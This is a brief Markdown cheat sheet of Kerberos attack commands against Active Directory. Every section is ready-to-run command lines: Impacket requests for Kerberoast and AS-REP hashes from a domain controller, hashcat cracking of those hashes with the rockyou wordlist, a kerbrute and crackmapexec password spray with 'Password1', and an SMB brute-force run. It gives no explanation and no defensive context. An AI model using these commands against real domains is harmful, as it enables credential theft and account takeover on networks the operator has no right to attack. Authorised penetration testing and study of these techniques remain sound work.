# Kerberos Attacks

## Kerberoasting
```bash
impacket-GetUserSPNs $DOMAIN/user:password@$DC_IP -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

## AS-REP Roasting
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -usersfile users.txt -format hashcat -request
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```

## Password Spray
```bash
kerbrute passwordspray -d $DOMAIN users.txt 'Password1'
crackmapexec smb $DC_IP -u users.txt -p 'Password1'
```

## Brute Force
```bash
crackmapexec smb $TARGET_IP -u users.txt -p passwords.txt
```
